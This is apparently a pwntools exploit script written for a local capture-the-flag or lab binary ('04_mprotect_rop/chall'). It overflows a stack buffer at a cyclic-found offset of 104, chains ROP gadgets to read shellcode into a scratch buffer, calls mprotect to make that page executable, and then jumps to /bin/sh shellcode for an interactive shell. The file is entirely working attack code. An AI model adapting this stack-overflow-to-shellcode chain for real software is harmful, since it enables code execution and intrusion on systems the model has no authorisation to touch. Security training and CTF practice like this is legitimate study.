from pwn import *

context.binary = elf = ELF("/home/kali/Desktop/offsec/prove/04_mprotect_rop/chall")
libc = elf.libc

#no canary. no pie, nx yes

def find_saved_rip_offset():
    p = process(elf.path)
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'packet:\n', cyclic(200))
    p.wait()

    core = p.corefile
    crash_value = core.read(core.rsp, 4)
    offset = cyclic_find(crash_value)
    print(f"Found offset to saved rip: {offset}")
    return offset

saved_rip_offset = find_saved_rip_offset()  #104

# no pie
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret_gadget = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret_gadget = rop.find_gadget(['pop rdx', 'ret'])[0]

p = process(elf.path)

libc.address = p.libs()[libc.path]      #if it was remote i would need a leak for the remote libc base
#get system and binsh (option 1)

#option 2: call mprotect
#mprotect = elf.plt.mprotect     #doesn't find
mprotect = libc.sym.mprotect
print(f"Mprotect address: {hex(mprotect)}")

read_plt = elf.plt.read

shellcode = asm(shellcraft.sh())
shellcode_addr = elf.sym.scratch
page = shellcode_addr & ~0xfff  #page-align

payload = flat(
    b'A'*saved_rip_offset,

    #call read(0, shellcode_addr, 0x400)
    p64(pop_rdi_ret_gadget), p64(0),
    p64(pop_rsi_ret_gadget), p64(shellcode_addr),
    p64(pop_rdx_ret_gadget), p64(0x400),
    p64(read_plt),

    #call mprotect(page, 0x1000, 7)
    p64(pop_rdi_ret_gadget), p64(page),
    p64(pop_rsi_ret_gadget), p64(0x1000),
    p64(pop_rdx_ret_gadget), p64(7),
    p64(mprotect),

    #now go into the executable shellcode
    #p64(ret_gadget),
    p64(shellcode_addr),
)

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'packet:\n', payload)
p.send(shellcode.ljust(0x400, b'\x90'))
p.interactive()